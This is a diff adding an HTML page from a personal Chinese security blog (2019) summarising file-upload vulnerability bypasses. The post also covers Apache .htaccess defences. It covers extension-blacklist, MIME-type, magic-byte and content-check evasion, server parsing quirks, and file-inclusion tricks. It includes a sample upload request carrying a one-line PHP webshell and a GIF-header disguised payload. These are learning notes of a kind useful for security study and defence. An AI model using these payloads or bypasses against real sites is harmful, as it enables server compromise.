@@ -1,0 +1,272 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>上传总结 | Leo.Li&#39;s Blog</title>
+  <meta name="author" content="Leo Li">
+
+  
+  <meta name="description" content="blog">
+  
+
+  
+  <meta name="keywords" content="hacked">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="上传总结">
+  <meta property="og:site_name" content="Leo.Li&#39;s Blog">
+
+  
+  
+
+  
+    <meta property="og:image" content="">
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon">
+  
+
+  <link rel="alternate" href="/atom.xml" title="Leo.Li&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+
+</head>
+</html>
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Leo.Li&#39;s Blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">主页</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/tags">标签</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2019-05-07T15:30:34.000Z"><a href="/2019/05/07/上传总结/">2019-05-07</a></time>
+      
+      
+  
+    <h1 class="title">上传总结</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>摘要：上传<br><a id="more"></a></p>
+<h1 id="上传总结"><a href="#上传总结" class="headerlink" title="上传总结"></a>上传总结</h1><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><hr>
+<p>&emsp;&emsp;没什么前言，就是想写了，老是光看文章是个事吗？经过自己总结的远比别人总结的好。所以，动手吧皮卡丘。</p>
+<h3 id="2-where"><a href="#2-where" class="headerlink" title="2.where"></a>2.where</h3><hr>
+<p>&emsp;&emsp;个人经历过的，头像、编辑器（Fckeditor）、文章图像附件，还有就是不知道为什么有的上传处。网上总结的还有数据库备份、插件文件等，肯定不全，自己后续碰到再慢慢总结吧。</p>
+<h3 id="3-how"><a href="#3-how" class="headerlink" title="3.how"></a>3.how</h3><hr>
+<p>&emsp;&emsp;一般上传如何进行防御。大体可以分为两种，前端或者后端校验。其中后端校验又可以分为后缀黑名单、后缀白名单、文件类型、文件头，甚至有检验文件内容的（比如GD库校验）。光是黑名单校验的绕过就有很多种方式，不包括绕waf的话，起码有四种方式，修改后缀、配合文件包含、配合中间件漏洞以及根据系统特性绕过。  </p>
+<h5 id="emsp-emsp-一-前端"><a href="#emsp-emsp-一-前端" class="headerlink" title="&emsp;&emsp;一. 前端"></a>&emsp;&emsp;一. 前端</h5><p>&emsp;&emsp;&emsp;<strong>1.</strong> 客户端javascript校验（一般只校验后缀名），先解释一下javascript：一种直译式脚本语言，它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言。最早是在HTML（标准通用标记语言下的一个应用）网页上使用，用来给HTML网页增加动态功能。<br>&emsp;&emsp;&emsp;反制：<br>&emsp;&emsp;&emsp;· 既然在HTML页面上使用，直接f12删除即可，跟html的hidden一样。<br>&emsp;&emsp;&emsp;· 抓包直接改后缀。<br>&emsp;&emsp;&emsp;· 网上说还有写脚本的方法。 </p>
+<h5 id="emsp-emsp-二-后端"><a href="#emsp-emsp-二-后端" class="headerlink" title="&emsp;&emsp;二. 后端"></a>&emsp;&emsp;二. 后端</h5><p>&emsp;&emsp;&emsp; <strong>1.后缀黑名单校验</strong><br>&emsp;&emsp;&emsp;&emsp;(a) 修改后缀，如果单纯黑名单只设置了php,jsp,aspx这些，<br>能被解析的文件扩展名列表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jsp jspx jspf</span><br><span class="line"></span><br><span class="line">asp asa cer aspx</span><br><span class="line"></span><br><span class="line">php php php3 php4 pht</span><br><span class="line"></span><br><span class="line">exe exee</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;&emsp;&emsp;(b) 配合文件包含漏洞（这里拿php为例，此漏洞主要存在于PHP中）<br>&emsp;&emsp;&emsp;&emsp;· 先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>&emsp;&emsp;&emsp;&emsp;· 然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#PHP</span><br><span class="line">&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; </span><br><span class="line">#ASP    </span><br><span class="line">&lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;</span><br><span class="line">#JSP    </span><br><span class="line">&lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;</span><br><span class="line">or  </span><br><span class="line">&lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;&emsp;&emsp;(c) 配合中间件漏洞<br>&emsp;&emsp;&emsp;&emsp;Apache：<br>&emsp;&emsp;&emsp;&emsp;&emsp;· 默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，比如1.php.jpg，apache会解析为1.php。<br>&emsp;&emsp;&emsp;&emsp;&emsp;· CRLF：Apache2.4.0~2.4.29换行解析漏洞%0d，%0a(CR,LF(回车，换行))<br>&emsp;&emsp;&emsp;&emsp;Nginx：<br>&emsp;&emsp;&emsp;&emsp;&emsp;· 对任意文件名，可以在后面添加/任意文件名.php造成解析漏洞，比如原文件是test.jpg，可以添加test.jpg/x.php进行解析。<br>&emsp;&emsp;&emsp;&emsp;&emsp;· 还有%00截断，建议参考<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html，理解%00截断与%00url编码之间运用的区别。" target="_blank" rel="noopener">http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html，理解%00截断与%00url编码之间运用的区别。</a><br>&emsp;&emsp;&emsp;&emsp;IIS：<br>&emsp;&emsp;&emsp;&emsp;&emsp;· IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。比如/test.asp/test.jpg或/test.asp;.jpg；<br>&emsp;&emsp;&emsp;&emsp;&emsp;· IIS7.5：配置错误无论该文件是否存在，都直接交给php处理，比如test.jpg/.php  </p>
+<p>&emsp;&emsp;&emsp;&emsp;(d) 配合操作系统文件命令规则<br>&emsp;&emsp;&emsp;&emsp;<em>Windows</em><br>&emsp;&emsp;&emsp;&emsp;· 上传不符合windows文件命名规则的文件名  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">　　test.asp(空格)</span><br><span class="line">　　test.php:1.jpg</span><br><span class="line">　　test.php::$DATA</span><br><span class="line">　　shell.php::$DATA…….</span><br></pre></td></tr></table></figure>
+<p>会被windows系统自动去掉不符合规则符号后面的内容。<br>&emsp;&emsp;&emsp;&emsp;· 修改文件名shell.php:.jpg，上传后如果得到一个空的文件shell.php，那就修改文件名为shell.&gt;&gt;&gt;或者shell.&lt;、shell.&lt;&lt;&lt;、shell.&gt;&gt;&lt;再上传，可以达到重写shell.php的效果。参考：<a href="https://www.freebuf.com/articles/web/201421.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/201421.html</a><br>&emsp;&emsp;&emsp;&emsp;<em>Linux</em><br>&emsp;&emsp;&emsp;&emsp;· linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
+<p>&emsp;&emsp;&emsp; <strong>2.后缀白名单校验</strong><br>&emsp;&emsp;&emsp;&emsp;祈祷有文件包含漏洞吧，大小写未实验是否可以绕过。  </p>
+<p>&emsp;&emsp;&emsp; <strong>3.文件类型校验</strong><br>&emsp;&emsp;&emsp;&emsp;(a) 使用各种各样的工具（如burpsuite）强行篡改Header就可以，太容易将header中的  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/php</span><br></pre></td></tr></table></figure>
+<p>或者其他类型改为   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpg  </span><br><span class="line">Content-Type: image/png  </span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure>
+<p>例如：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">TE: deflate,gzip;q=0.3</span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/5.803</span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: 155</span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif (原为 Content-Type: text/plain)</span><br><span class="line">&lt;?php system($_GET[&apos;command&apos;]);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
+<p>等这些web程序允许的泪洗改附上常用的MIMETYPE表  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">text/plain（纯文本）  </span><br><span class="line">text/html（HTML文档）  </span><br><span class="line">text/javascript（js代码）  </span><br><span class="line">application/xhtml+xml（XHTML文档）  </span><br><span class="line">image/gif（GIF图像）  </span><br><span class="line">image/jpeg（JPEG图像）  </span><br><span class="line">image/png（PNG图像）  </span><br><span class="line">video/mpeg（MPEG动画）  </span><br><span class="line">application/octet-stream（二进制数据）  </span><br><span class="line">application/pdf（PDF文档）  </span><br><span class="line">application/(编程语言) 该种语言的代码  </span><br><span class="line">application/msword（Microsoft Word文件）  </span><br><span class="line">message/rfc822（RFC 822形式）  </span><br><span class="line">multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）  </span><br><span class="line">application/x-www-form-urlencoded（POST方法提交的表单）  </span><br><span class="line">multipart/form-data（POST提交时伴随文件上传的表单）</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;&emsp; <strong>4.</strong> 文件头校验<br>&emsp;&emsp;可以通过比如php的exif_imagetype()函数，一个通过这种方法来过滤的示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (! exif_imagetype($_FILES[&apos;uploadedfile&apos;][&apos;tmp_name&apos;])) &#123;  </span><br><span class="line">        echo &quot;File is not an image&quot;;  </span><br><span class="line">        return;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;也可以自己编写函数来进行识别，图片文件通常有称作幻数的头字节，我们来看一下几种图片文件的幻数：</p>
+<p>（注意！下面是二进制而不是文本格式的数据）<br>JPG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0 00 10 4A 46 49 46</span><br></pre></td></tr></table></figure></p>
+<p>GIF<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">47 49 46 38 39 61  </span><br><span class="line">(相当于文本的GIF89a)</span><br></pre></td></tr></table></figure></p>
+<p>PNG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure></p>
+<p>通过检查头几位字节，可以分辨是否是图片文件  </p>
+<p><strong>反制</strong><br>&emsp;&emsp;给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：</p>
+<p>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a  </span><br><span class="line">&lt;?php  </span><br><span class="line">do_something();  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;如果是其他类型的二进制文件，也有响应的头字节，如下表  </p>
+<img src="/2019/05/07/上传总结/gif.png" title="图片1">
+<center>图1</center>   
+
+<p>&emsp;&emsp;&emsp; <strong>5.文件内容校验</strong><br>&emsp;&emsp;顾名思义，就是对上传文件的内容进行过滤，常见于bypass waf，waf极有可能会检测上传的内容。以及用户头像处（GD库渲染）。<br>&emsp;&emsp;&emsp;&emsp;(a) 配合文件包含漏洞（这里拿php为例，此漏洞主要存在于PHP中）<br>&emsp;&emsp;&emsp;&emsp;· 先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>&emsp;&emsp;&emsp;&emsp;· 然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#PHP</span><br><span class="line">&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; </span><br><span class="line">#ASP    </span><br><span class="line">&lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;</span><br><span class="line">#JSP    </span><br><span class="line">&lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;</span><br><span class="line">or  </span><br><span class="line">&lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;&emsp;&emsp;(b)GD库渲染<br>&emsp;&emsp;&emsp;&emsp;一般出现在上传头像处。由于服务器会对图片进行处理，具体怎么处理未了解。个人是使用beyongCompare对上传前后的图像进行对比，一般上传前后的图片内容变化较大，找到两份图片一致的地方并放入webshell，如果没有webshell检测，基本就可以配合后缀绕过上传至用户头像了。</p>
+<p>&emsp;&emsp;&emsp;&emsp; <strong>6. 限制Web Server对于特定类型文件的行为</strong><br>&emsp;&emsp;&emsp;导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般来说，用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。</p>
+<p>&emsp;&emsp;&emsp;大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以Apache为例：</p>
+<p>&emsp;&emsp;&emsp;在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码</p>
+<p>&emsp;&emsp;&emsp;因此可以使用服务器程序的接口来进行限制</p>
+<p>&emsp;&emsp;&emsp;以Apache为例,我们可以利用 .htaccess 文件机制来对web server行为进行限制</p>
+<p>&emsp;&emsp;&emsp;在这里插一句，如果不是专门的文件下载目录，请务必关掉文件夹浏览的权限，以防止嗅探和可能的越权，也是使用.htaccess文件，在其中加上一句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Options All -Indexes</span><br></pre></td></tr></table></figure>
+<p>即可。</p>
+<p>&emsp;&emsp;&emsp;禁止脚本执行有多种方式可以实现，而且分别有不同的效果，我们分别来看一下</p>
+<p>&emsp;&emsp;&emsp; <strong>·</strong> 指定特定扩展名的文件的处理方式,原理是指定Response的Content-Type可以加上如下几行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType text/plain .pl .py .php</span><br></pre></td></tr></table></figure>
+<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的Content-Type</p>
+<p>&emsp;&emsp;&emsp; <strong>·</strong> 如果要完全禁止特定扩展名的文件被访问，用下面的几行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options -ExecCGI</span><br><span class="line">AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</span><br></pre></td></tr></table></figure>
+<p>在这种情况下，以上几种类型的文件被访问的时候，会返回403 Forbidden的错误</p>
+<p>&emsp;&emsp;&emsp; <strong>·</strong> 也可以强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt;</span><br><span class="line">ForceType text/plain</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>看代码就可以很明白的知道，符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>
+<p>&emsp;&emsp;&emsp; <strong>·</strong> 只允许访问特定类型的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;</span><br><span class="line">order deny,allow</span><br><span class="line">deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+<p>在一个上传图片的文件夹下面，就可以加上这段代码，使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问。</p>
+<p>这又是一个白名单的处理方案</p>
+<p>永远记得，白名单是最有保障的安全措施</p>
+<p><strong>反制：</strong><br>&emsp;&emsp;可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p>
+<p><strong>7. 其他</strong><br>参考：<a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/" target="_blank" rel="noopener">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</a></p>
+<p>参考：<br><a href="https://www.freebuf.com/articles/web/201421.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/201421.html</a><br><a href="https://mp.weixin.qq.com/s/FUNJM3P5g-_uGfSCB4MrjQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/FUNJM3P5g-_uGfSCB4MrjQ</a><br><a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/" target="_blank" rel="noopener">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</a><br><a href="http://www.cnblogs.com/shellr00t/p/6426945.html" target="_blank" rel="noopener">http://www.cnblogs.com/shellr00t/p/6426945.html</a><br><a href="https://www.freebuf.com/vuls/128846.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/128846.html</a></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/WEB/">WEB</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:blog.youdube.ga">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">Categories</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/APP/">APP</a><small>1</small></li>
+  
+    <li><a href="/categories/WEB/">WEB</a><small>1</small></li>
+  
+    <li><a href="/categories/区块链/">区块链</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2019/08/17/内部域名/">内部域名</a>
+      </li>
+    
+      <li>
+        <a href="/2019/05/07/上传总结/">上传总结</a>
+      </li>
+    
+      <li>
+        <a href="/2019/04/23/渗透感想/">渗透感想</a>
+      </li>
+    
+      <li>
+        <a href="/2019/02/10/浅析https原理以及过程/">浅析https原理以及过程</a>
+      </li>
+    
+      <li>
+        <a href="/2019/01/01/我认识的区块链/">初始区块链</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/APP/">APP</a><small>1</small></li>
+  
+    <li><a href="/tags/WEB/">WEB</a><small>4</small></li>
+  
+    <li><a href="/tags/区块链/">区块链</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2019 Leo Li
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="bg"></div>
+</body>
+</html>
